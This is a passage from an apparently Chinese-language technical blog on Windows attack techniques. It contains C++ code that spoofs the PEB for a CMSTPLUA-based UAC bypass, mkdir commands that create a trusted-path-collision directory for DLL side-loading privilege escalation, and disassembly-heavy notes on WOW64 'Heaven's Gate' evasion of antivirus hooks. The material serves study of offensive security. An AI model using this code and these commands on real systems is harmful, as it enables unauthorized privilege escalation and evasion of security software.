LDR_DATA_TABLE_ENTRY32, InMemoryOrderModuleList);</span><br><span class="line">    <span class="comment">// patch current image path + arguments</span></span><br><span class="line">    <span class="built_in">pfnRtlInitUnicodeString</span>(&amp;pPEB-&gt;ProcessParameters-&gt;ImagePathName, lpExplorePath);</span><br><span class="line">    <span class="built_in">pfnRtlInitUnicodeString</span>(&amp;pPEB-&gt;ProcessParameters-&gt;CommandLine, lpExplorePath);</span><br><span class="line">    <span class="comment">// patch loaded module name in PEB-&gt;LDR</span></span><br><span class="line">    <span class="built_in">pfnRtlInitUnicodeString</span>((PUNICODE_STRING)&amp;data-&gt;FullDllName, lpExplorePath);</span><br><span class="line">    <span class="built_in">pfnRtlInitUnicodeString</span>((PUNICODE_STRING)&amp;data-&gt;BaseDllName, <span class="string">L&quot;explorer.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SUCCEEDED</span>(<span class="built_in">fn_call_CMSTPLUA_shellexecute</span>()))</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] successful&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="透过信任路径碰撞达成提权"><a href="#透过信任路径碰撞达成提权" class="headerlink" title="透过信任路径碰撞达成提权"></a>透过信任路径碰撞达成提权</h3><p>对于Windows内建的BitLockerWizardElev.exe磁碟加密工具，自身标注为需要管理员权限执行requireAdministrator和自动特权提升autoElevate的。特权自动提升的三个条件如下，其中前两个此时已满足了：</p>
<ol>
<li>执行程式需将自身配置为AutoElevation；</li>
<li>程式档案具有有效数位签名；</li>
<li>从可信任的系统目录被执行起来。</li>
</ol>
<p>分析其导入表发现需要引入<code>FVEWIZ!FveuiWizard</code>和<code>FVEWIZ!FveuipClearFveWizOnStartup</code>，此时应使用DLL Side-Loading手段，撰写一个恶意DLL模组导出这俩函数并劫持执行流程。C:\Windows\System32和C:\Windows\SysWOW64无法被任意写入档案与创建资料夹是因为系统槽被配置了DACL，认证A过程中先用<code>GetLongPathNameW</code>从子进程路径中提取出NT Path长路径而后便以此长路径用<code>RtlPrefixUnicodeString</code>比较是否路径开头为上面那俩，就予以通过认证A。但在呼叫<code>GetLongPathNameW</code>取出NT Path长路径内部发生Windows路径正则化，使UAC特权服务在信任认证A中比对的路径是受路径正规化过后的长路径，使得C:\下不能创建或写入档案，但可以创建新资料夹。之后通过认证A和B后，consent.exe要唤醒用户授权弹窗，但<code>CreateProcessAsUserW</code>创建子进程时不是使用认证完毕的长路径来生成进程，而是以父进程给出的原始子进程路径来生成进程。于是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> <span class="string">&quot;\??\C:\Windows \&quot;</span></span><br><span class="line"><span class="string">mkdir &quot;</span>\??\C:\Windows \System32\&quot;</span><br></pre></td></tr></table></figure>

<p>在上述创建的目录下放置同名恶意软件，运行后可自动提权，且有数位签名。</p>
<h2 id="重建天堂之门：探索WOW64模拟机至夺回64位元天堂胜地"><a href="#重建天堂之门：探索WOW64模拟机至夺回64位元天堂胜地" class="headerlink" title="重建天堂之门：探索WOW64模拟机至夺回64位元天堂胜地"></a>重建天堂之门：探索WOW64模拟机至夺回64位元天堂胜地</h2><h3 id="入门-1"><a href="#入门-1" class="headerlink" title="入门"></a>入门</h3><p>32位程式托管于原生64位进程中运行的状态统称位WOW64进程。一个标准的WOW64进程的记忆体分布如下，挂载的DLL模组同时具有32位和64位两种模块。32位程式仅能使用32位DLL，但64位原生系统看不懂32位DLL发送的系统中断，所以记忆体中出现同名模组的32&#x2F;64位模组同时挂载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0   iexplorer.exe*32</span><br><span class="line">    ntdll.dll*32</span><br><span class="line">    wow64.dll</span><br><span class="line">    wow64cpu.dll</span><br><span class="line">    wow64win.dll</span><br><span class="line">    TEB64</span><br><span class="line">    TEB32</span><br><span class="line">    PEB64</span><br><span class="line">    PEB32</span><br><span class="line">4GB ntdll.dll</span><br><span class="line">8EB</span><br></pre></td></tr></table></figure>

<p>当托管于WOW64进程中的32位程式呼叫32位模组导出函数，接着透过WOW64模拟层将32位Win32API请求翻译为对应64位模组请求，最终以64位模组对应API发出64位系统中断给64位系统，完成一次WOW64系统中断：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">;SysWOW64下的ntdll32.dll 过渡层函数</span><br><span class="line">.text:4B2F6A80                             ; __stdcall ZwResumeThread(x, x)</span><br><span class="line">.text:4B2F6A80                                             public _ZwResumeThread@8</span><br><span class="line">.text:4B2F6A80                             _ZwResumeThread@8 proc near             ; CODE XREF: EtwpCreateEtwThread(x,x)+2E↑p</span><br><span class="line">.text:4B2F6A80                                                                     ; RtlSetProcessDebugInformation(x,x,x)+9F↓p ...</span><br><span class="line">.text:4B2F6A80 000 B8 52 00 07 00                          mov     eax, 70052h     ; NtResumeThread 当前欲呼叫的系统函数识别码</span><br><span class="line">.text:4B2F6A85 000 BA 30 8C 31 4B                          mov     edx, offset _Wow64SystemServiceCall@0 ; Wow64SystemServiceCall()</span><br><span class="line">.text:4B2F6A8A 000 FF D2                                   call    edx ; Wow64SystemServiceCall() ; Indirect Call Near Procedure</span><br><span class="line">.text:4B2F6A8C 000 C2 08 00                                retn    8               ; Return Near from Procedure</span><br><span class="line">.text:4B2F6A8C                             _ZwResumeThread@8 endp</span><br><span class="line">;通过WOW64模拟层</span><br><span class="line">;System32下的ntdll64.dll</span><br><span class="line">.text:000000018009F830                                             public ZwResumeThread</span><br><span class="line">.text:000000018009F830                             ZwResumeThread  proc near               ; CODE XREF: EtwpCreateEtwThread+46↑p</span><br><span class="line">.text:000000018009F830                                                                     ; RtlpWow64SuspendThread+AEED3↓p ...</span><br><span class="line">.text:000000018009F830 000 4C 8B D1                                mov     r10, rcx        ; NtResumeThread</span><br><span class="line">.text:000000018009F833 000 B8 52 00 00 00                          mov     eax, 52h ; &#x27;R&#x27;</span><br><span class="line">.text:000000018009F838 000 F6 04 25 08 03 FE 7F 01                 test    byte ptr ds:7FFE0308h, 1 ; Logical Compare</span><br><span class="line">.text:000000018009F840 000 75 03                                   jnz     short loc_18009F845 ; Jump if Not Zero (ZF=0)</span><br><span class="line">.text:000000018009F842 000 0F 05                                   syscall                 ; Low latency system call</span><br><span class="line">.text:000000018009F844 000 C3                                      retn                    ; Return Near from Procedure</span><br><span class="line">.text:000000018009F845                             ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000018009F845</span><br><span class="line">.text:000000018009F845                             loc_18009F845:                          ; CODE XREF: ZwResumeThread+10↑j</span><br><span class="line">.text:000000018009F845 000 CD 2E                                   int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND</span><br><span class="line">.text:000000018009F845                                                                     ; DS:SI -&gt; counted CR-terminated command string</span><br><span class="line">.text:000000018009F847 000 C3                                      retn                    ; Return Near from Procedure</span><br><span class="line">.text:000000018009F847                             ZwResumeThread  endp</span><br></pre></td></tr></table></figure>

<p>在上述过程中，防毒软体使用API Hooking，挂钩经常被恶意使用的系统API，如<code>NtResumeThread</code>，修改其组合语言程式码片段前5字节为jmp，跳转至防毒设计的陷阱函数中扫描此次呼叫的参数是否恶意。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">;NtResumeThread Hooked ntdll32</span><br><span class="line">jmp hkNtResumeThread ;e9xxxxxx</span><br><span class="line">mov edx,ntdll!Wow64SystemServiceCall</span><br><span class="line">call edx</span><br><span class="line">ret 8</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">;hkResumeThread</span><br><span class="line">;...</span><br><span class="line">ret trampolineNtResumeThread;</span><br><span class="line"></span><br><span class="line">;WOW64模拟层 trampolineNtResumeThread</span><br><span class="line">mov eax,70052</span><br><span class="line">jmp NtResumeThread+sizeof(jmp)</span><br><span class="line"></span><br><span class="line">;NtResumeThread ntdll64</span><br><span class="line">mov r10,rcx</span><br><span class="line">mov eax,52h</span><br><span class="line">test [SharedUserData+0x308],1</span><br><span class="line">jne ntdll!NtResumeThread+0x15</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line">int 2e</span><br></pre></td></tr></table></figure>

<p>上述过程只挂钩了ntdll32.dll，微软并不愿意攻击方或防守方直接挂钩64位DLL，且若<code>ntdll64!LdrLoadDll</code>被调用于挂载任何64位DLL至WOW64则自动拒绝。当WOW64进程在初始化阶段会进入<code>wow64!Map64BitDlls</code>函数，将所有系统常见的已知DLL如Kernel32、User32、GDI等攻击者常滥用的64位系统模组都先挂载一份到记忆体VAD中，但不在64位PEB的Ldr模组资讯中记录挂在了这些64位DLL模组。这等于熊在WOW64进程预先挂载并占用这些攻击者想用的64位DLL模组记忆体，无法在64位kernel32.dll模组想使用的地址上申请记忆体，任何天堂之门攻击想要用<code>ntdll64!LdrLoadDll</code>来挂载64位kernel32.dll就必定失败。</p>
<p>为了绕过这项保护，成功在WOW64进程中挂载64位DLL，可以先用<code>ntdll64!NtUnmapViewOfSection</code>把那块记忆体释放掉，接着用<code>ntdll64!LdrLoadDll</code>就能成功挂载了。但在Windows 10后导入了Control Flow Guard（CFG），使得上述方法失败，因为WOW64进程的64位空间里没有64位Bitmap能让攻击者想挂载的系统DLL的CFG能启用，导致DLL无法被挂载。</p>
<h3 id="WOW64模拟机初始化"><a href="#WOW64模拟机初始化" class="headerlink" title="WOW64模拟机初始化"></a>WOW64模拟机初始化</h3><p>任何WOW64进程一开始也是64位线程，通过64位<code>wow64cpu!RunSimulatedCode</code>将自身降为32位模式进程状态：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">.text:000000006B101650                                ; void __fastcall RunSimulatedCode(__int64, __int64, __int64, __int64, char, int, __int64, int, __int64, __int64)</span><br><span class="line">.text:000000006B101650                                RunSimulatedCode proc near              ; CODE XREF: BTCpuSimulate:loc_6B101D70↓p</span><br><span class="line">.text:000000006B101650                                                                        ; DATA XREF: .pdata:000000006B106078↓o</span><br><span class="line">.text:000000006B101650</span><br><span class="line">.text:000000006B101650                                var_A8          = qword ptr -0A8h</span><br><span class="line">.text:000000006B101650                                var_A0          = word ptr -0A0h</span><br><span class="line">.text:000000006B101650                                var_98          = dword ptr -98h</span><br><span class="line">.text:000000006B101650                                var_90          = qword ptr -90h</span><br><span class="line">.text:000000006B101650                                var_88          = qword ptr -88h</span><br><span class="line">.text:000000006B101650                                var_80          = qword ptr -80h</span><br><span class="line">.text:000000006B101650                                var_78          = qword ptr -78h</span><br><span class="line">.text:000000006B101650                                var_70          = qword ptr -70h</span><br><span class="line">.text:000000006B101650                                var_68          = qword ptr -68h</span><br><span class="line">.text:000000006B101650                                var_60          = qword ptr -60h</span><br><span class="line">.text:000000006B101650                                var_58          = qword ptr -58h</span><br><span class="line">.text:000000006B101650                                var_50          = dword ptr -50h</span><br><span class="line">.text:000000006B101650                                var_48          = dword ptr -48h</span><br><span class="line">.text:000000006B101650                                arg_0           = word ptr  8</span><br><span class="line">.text:000000006B101650                                arg_8           = dword ptr  10h</span><br><span class="line">.text:000000006B101650                                arg_10          = qword ptr  18h</span><br><span class="line">.text:000000006B101650                                arg_18          = qword ptr  20h</span><br><span class="line">.text:000000006B101650                                arg_20          = byte ptr  28h</span><br><span class="line">.text:000000006B101650                                arg_30          = dword ptr  38h</span><br><span class="line">.text:000000006B101650                                arg_34          = dword ptr  3Ch</span><br><span class="line">.text:000000006B101650                                arg_38          = dword ptr  40h</span><br><span class="line">.text:000000006B101650                                arg_40          = qword ptr  48h</span><br><span class="line">.text:000000006B101650                                arg_48          = qword ptr  50h</span><br><span class="line">.text:000000006B101650</span><br><span class="line">.text:000000006B101650                                ; __unwind &#123; // CpupSimulateHandler</span><br><span class="line">.text:000000006B101650 000 41 57                                      push    r15</span><br><span class="line">.text:000000006B101652 008 41 56                                      push    r14</span><br><span class="line">.text:000000006B101654 010 41 55                                      push    r13</span><br><span class="line">.text:000000006B101656 018 41 54                                      push    r12</span><br><span class="line">.text:000000006B101658 020 53                                         push    rbx</span><br><span class="line">.text:000000006B101659 028 56                                         push    rsi</span><br><span class="line">.text:000000006B10165A 030 57                                         push    rdi</span><br><span class="line">.text:000000006B10165B 038 55                                         push    rbp</span><br><span class="line">.text:000000006B10165C 040 48 83 EC 68                                sub     rsp, 68h        ; Integer Subtraction</span><br><span class="line">.text:000000006B101660 0A8 65 4C 8B 24 25 30 00 00 00                 mov     r12, gs:30h ;r12指向当前64位TEB结构地址</span><br><span class="line">.text:000000006B101669 0A8 4C 8D 3D 00 31 00 00                       lea     r15, TurboThunkDispatch ; Load Effective Address</span><br><span class="line">.text:000000006B101670 0A8 4D 8B AC 24 88 14 00 00                    mov     r13, [r12+1488h] ;64位TEB+1488h为32位TEB 该结构用于32位执行出WOW64模拟器最新运行状态的快照</span><br><span class="line">.text:000000006B101678 0A8 49 81 C5 80 00 00 00                       add     r13, 80h        ; Add</span><br><span class="line">.text:000000006B10167F</span><br><span class="line">.text:000000006B10167F                                loc_6B10167F:                           ; CODE XREF: RunSimulatedCode+16E↓j</span><br><span class="line">.text:000000006B10167F 0A8 41 0F BA 75 80 00                          btr     dword ptr [r13-80h], 0 ; Bit Test and Reset</span><br><span class="line">.text:000000006B101685 0A8 72 37                                      jb      short loc_6B1016BE ; Jump if Below (CF=1)</span><br><span class="line">.text:000000006B101687 0A8 41 8B 7D 20                                mov     edi, [r13+20h]</span><br><span class="line">.text:000000006B10168B 0A8 41 8B 75 24                                mov     esi, [r13+24h]</span><br><span class="line">.text:000000006B10168F 0A8 41 8B 5D 28                                mov     ebx, [r13+28h]</span><br><span class="line">.text:000000006B101693 0A8 41 8B 6D 38                                mov     ebp, [r13+38h]</span><br><span class="line">.text:000000006B101697 0A8 41 8B 45 34                                mov     eax, [r13+34h]</span><br><span class="line">.text:000000006B10169B 0A8 4C 8B F4                                   mov     r14, rsp</span><br><span class="line">.text:000000006B10169E 0A8 C7 44 24 04 23 00 00 00                    mov     dword ptr [rsp+0A8h+var_A8+4], 23h ; &#x27;#&#x27;</span><br><span class="line">.text:000000006B1016A6 0A8 41 B8 2B 00 00 00                          mov     r8d, 2Bh ; &#x27;+&#x27;</span><br><span class="line">.text:000000006B1016AC 0A8 41 8E D0                                   mov     ss, r8d</span><br><span class="line">.text:000000006B1016AF 0A8 45 8B 4D 3C                                mov     r9d, [r13+3Ch]</span><br><span class="line">.text:000000006B1016B3 0A8 44 89 0C 24                                mov     dword ptr [rsp+0A8h+var_A8], r9d</span><br><span class="line">.text:000000006B1016B7 0A8 41 8B 65 48                                mov     esp, [r13+48h]</span><br><span class="line">.text:000000006B1016BB 0A8 41 FF 2E                                   jmp     fword ptr [r14] ; Indirect Far Jump</span><br><span class="line">.text:000000006B1016BE                                ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000006B1016BE</span><br><span class="line">.text:000000006B1016BE                                loc_6B1016BE:                           ; CODE XREF: RunSimulatedCode+35↑j</span><br><span class="line">.text:000000006B1016BE 0A8 B9 2B 00 00 00                             mov     ecx, 2Bh ; &#x27;+&#x27;</span><br><span class="line">.text:000000006B1016C3 0A8 8E D9                                      mov     ds, ecx</span><br><span class="line">.text:000000006B1016C5                                                assume ds:nothing</span><br><span class="line">.text:000000006B1016C5 0A8 8E C1                                      mov     es, ecx</span><br><span class="line">.text:000000006B1016C7                                                assume es:nothing</span><br><span class="line">.text:000000006B1016C7 0A8 8E E9                                      mov     gs, ecx</span><br><span class="line">.text:000000006B1016C9                                                assume gs:nothing</span><br><span class="line">.text:000000006B1016C9 0A8 4C 8B 05 88 2C 00 00                       mov     r8, cs:CpupUserSharedData</span><br><span class="line">.text:000000006B1016D0 0A8 41 F6 80 8A 02 00 00 FF                    test    byte ptr [r8+28Ah], 0FFh ; Logical Compare</span><br><span class="line">.text:000000006B1016D8 0A8 75 0B                                      jnz     short loc_6B1016E5 ; Jump if Not Zero (ZF=0)</span><br><span class="line">.text:000000006B1016DA 0A8 41 B8 53 00 00 00                          mov     r8d, 53h ; &#x27;S&#x27;</span><br><span class="line">.text:000000006B1016E0 0A8 41 8E E0                                   mov     fs, r8d</span><br><span class="line">.text:000000006B1016E3 0A8 EB 0E                                      jmp     short loc_6B1016F3 ; Jump</span><br><span class="line">.text:000000006B1016E5                                ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000006B1016E5</span><br><span class="line">.text:000000006B1016E5                                loc_6B1016E5:                           ; CODE XREF: RunSimulatedCode+88↑j</span><br><span class="line">.text:000000006B1016E5 0A8 65 4C 8B 04 25 00 00 00 00                 mov     r8, gs:0</span><br><span class="line">.text:000000006B1016EE 0A8 F3 49 0F AE D0                             wrfsbase r8             ; Write FS Segment Base</span><br><span class="line">.text:000000006B1016F3</span><br><span class="line">.text:000000006B1016F3                                loc_6B1016F3:                           ; CODE XREF: RunSimulatedCode+93↑j</span><br><span class="line">.text:000000006B1016F3 0A8 41 0F 28 85 F0 00 00 00                    movaps  xmm0, xmmword ptr [r13+0F0h] ; Move Aligned Four Packed Single-FP</span><br><span class="line">.text:000000006B1016FB 0A8 41 0F 28 8D 00 01 00 00                    movaps  xmm1, xmmword ptr [r13+100h] ; Move Aligned Four Packed Single-FP</span><br><span class="line">.text:000000006B101703 0A8 41 0F 28 95 10 01 00 00                    movaps  xmm2, xmmword ptr [r13+110h] ; Move Aligned Four Packed Single-FP</span><br><span class="line">.text:000000006B10170B 0A8 41 0F 28 9D 20 01 00 00                    movaps  xmm3, xmmword ptr [r13+120h] ; Move Aligned Four Packed Single-FP</span><br><span class="line">.text:000000006B101713 0A8 41 0F 28 A5 30 01 00 00                    movaps  xmm4, xmmword ptr [r13+130h] ; Move Aligned Four Packed Single-FP</span><br><span class="line">.text:000000006B10171B 0A8 41 0F 28 AD 40 01 00 00                    movaps  xmm5, xmmword ptr [r13+140h] ; Move Aligned Four Packed Single-FP</span><br><span class="line">.text:000000006B101723 0A8 41 8B 4D 30                                mov     ecx, [r13+30h]</span><br><span class="line">.text:000000006B101727 0A8 41 8B 55 2C                                mov     edx, [r13+2Ch]</span><br><span class="line">.text:000000006B10172B 0A8 41 83 65 80 FF                             and     dword ptr [r13-80h], 0FFFFFFFFh ; Logical AND</span><br><span class="line">.text:000000006B101730 0A8 41 8B 7D 20                                mov     edi, [r13+20h]</span><br><span class="line">.text:000000006B101734 0A8 41 8B 75 24                                mov     esi, [r13+24h]</span><br><span class="line">.text:000000006B101738 0A8 41 8B 5D 28                                mov     ebx, [r13+28h]</span><br><span class="line">.text:000000006B10173C 0A8 41 8B 6D 38                                mov     ebp, [r13+38h]</span><br><span class="line">.text:000000006B101740 0A8 41 8B 45 34                                mov     eax, [r13+34h]</span><br><span class="line">.text:000000006B101744 0A8 4C 8B F4                                   mov     r14, rsp</span><br><span class="line">.text:000000006B101747 0A8 66 C7 44 24 08 23 00                       mov     [rsp+0A8h+var_A0], 23h ; &#x27;#&#x27;</span><br><span class="line">.text:000000006B10174E 0A8 66 C7 44 24 20 2B 00                       mov     word ptr [rsp+0A8h+var_88], 2Bh ; &#x27;+&#x27;</span><br><span class="line">.text:000000006B101755 0A8 45 8B 45 44                                mov     r8d, [r13+44h]</span><br><span class="line">.text:000000006B101759 0A8 41 81 65 44 FF FE FF FF                    and     dword ptr [r13+44h], 0FFFFFEFFh ; Logical AND</span><br><span class="line">.text:000000006B101761 0A8 44 89 44 24 10                             mov     [rsp+0A8h+var_98], r8d</span><br><span class="line">.text:000000006B101766 0A8 45 8B 45 48                                mov     r8d, [r13+48h]</span><br><span class="line">.text:000000006B10176A 0A8 4C 89 44 24 18                             mov     [rsp+0A8h+var_90], r8</span><br><span class="line">.text:000000006B10176F 0A8 45 8B 45 3C                                mov     r8d, [r13+3Ch]</span><br><span class="line">.text:000000006B101773 0A8 4C 89 04 24                                mov     [rsp+0A8h+var_A8], r8</span><br><span class="line">.text:000000006B101777 0A8 48 CF                                      iretq                   ; Interrupt Return (use64)</span><br></pre></td></tr></table></figure>

<h3 id="TurboThunkDispatch"><a href="#TurboThunkDispatch" class="headerlink" title="TurboThunkDispatch"></a>TurboThunkDispatch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">.rdata:000000006B104770 AF 17 10 6B 00 00 00 00        TurboThunkDispatch dq offset TurboDispatchJumpAddressEnd</span><br><span class="line">.rdata:000000006B104770                                                                        ; DATA XREF: RunSimulatedCode+19↑o</span><br><span class="line">.rdata:000000006B104770                                                                        ; BTCpuTurboThunkControl:loc_6B101EB6↑r ...</span><br><span class="line">.rdata:000000006B104778 AF 1C 10 6B 00 00 00 00        off_6B104778    dq offset Thunk0Arg     ; DATA XREF: BTCpuTurboThunkControl+A1↑w</span><br><span class="line">.rdata:000000006B104780 51 1B 10 6B 00 00 00 00        off_6B104780    dq offset Thunk0ArgReloadState</span><br><span class="line">.rdata:000000006B104780                                                                        ; DATA XREF: BTCpuTurboThunkControl+A8↑w</span><br><span class="line">.rdata:000000006B104788 5F 1C 10 6B 00 00 00 00        off_6B104788    dq offset Thunk1ArgSp   ; DATA XREF: BTCpuTurboThunkControl+AF↑w</span><br><span class="line">.rdata:000000006B104790 70 1C 10 6B 00 00 00 00        off_6B104790    dq offset Thunk1ArgNSp  ; DATA XREF: BTCpuTurboThunkControl+B6↑w</span><br><span class="line">.rdata:000000006B104798 6C 1C 10 6B 00 00 00 00        off_6B104798    dq offset Thunk2ArgNSpNSp</span><br><span class="line">.rdata:000000006B104798                                                                        ; DATA XREF: BTCpuTurboThunkControl+BD↑w</span><br><span class="line">.rdata:000000006B1047A0 C6 1B 10 6B 00 00 00 00        off_6B1047A0    dq offset Thunk2ArgNSpNSpReloadState</span><br><span class="line">.rdata:000000006B1047A0                                                                        ; DATA XREF: BTCpuTurboThunkControl+C4↑w</span><br><span class="line">.rdata:000000006B1047A8 79 1C 10 6B 00 00 00 00        off_6B1047A8    dq offset Thunk2ArgSpNSp</span><br><span class="line">.rdata:000000006B1047A8                                                                        ; DATA XREF: BTCpuTurboThunkControl+CB↑w</span><br><span class="line">.rdata:000000006B1047B0 5B 1C 10 6B 00 00 00 00        off_6B1047B0    dq offset Thunk2ArgSpSp ; DATA XREF: BTCpuTurboThunkControl+D2↑w</span><br><span class="line">.rdata:000000006B1047B8 4A 1C 10 6B 00 00 00 00        off_6B1047B8    dq offset Thunk2ArgNSpSp</span><br><span class="line">.rdata:000000006B1047B8                                                                        ; DATA XREF: BTCpuTurboThunkControl+D9↑w</span><br><span class="line">.rdata:000000006B1047C0 68 1C 10 6B 00 00 00 00        off_6B1047C0    dq offset Thunk3ArgNSpNSpNSp</span><br><span class="line">.rdata:000000006B1047C0                                                                        ; DATA XREF: BTCpuTurboThunkControl+E0↑w</span><br><span class="line">.rdata:000000006B1047C8 57 1C 10 6B 00 00 00 00        off_6B1047C8    dq offset Thunk3ArgSpSpSp</span><br><span class="line">.rdata:000000006B1047C8                                                                        ; DATA XREF: BTCpuTurboThunkControl+E7↑w</span><br><span class="line">.rdata:000000006B1047D0 82 1C 10 6B 00 00 00 00        off_6B1047D0    dq offset Thunk3ArgSpNSpNSp</span><br><span class="line">.rdata:000000006B1047D0                                                                        ; DATA XREF: BTCpuTurboThunkControl+EE↑w</span><br><span class="line">.rdata:000000006B1047D8 46 1B 10 6B 00 00 00 00        off_6B1047D8    dq offset Thunk3ArgSpNSpNSpReloadState</span><br><span class="line">.rdata:000000006B1047D8                                                                        ; DATA XREF: BTCpuTurboThunkControl+F5↑w</span><br><span class="line">.rdata:000000006B1047E0 93 1C 10 6B 00 00 00 00        off_6B1047E0    dq offset Thunk3ArgSpSpNSp</span><br><span class="line">.rdata:000000006B1047E0                                                                        ; DATA XREF: BTCpuTurboThunkControl+FC↑w</span><br><span class="line">.rdata:000000006B1047E8 46 1C 10 6B 00 00 00 00        off_6B1047E8    dq offset Thunk3ArgNSpSpNSp</span><br><span class="line">.rdata:000000006B1047E8                                                                        ; DATA XREF: BTCpuTurboThunkControl+103↑w</span><br><span class="line">.rdata:000000006B1047F0 75 1C 10 6B 00 00 00 00        off_6B1047F0    dq offset Thunk3ArgSpNSpSp</span><br><span class="line">.rdata:000000006B1047F0                                                                        ; DATA XREF: BTCpuTurboThunkControl+10A↑w</span><br><span class="line">.rdata:000000006B1047F8 64 1C 10 6B 00 00 00 00        off_6B1047F8    dq offset Thunk4ArgNSpNSpNSpNSp</span><br><span class="line">.rdata:000000006B1047F8                                                                        ; 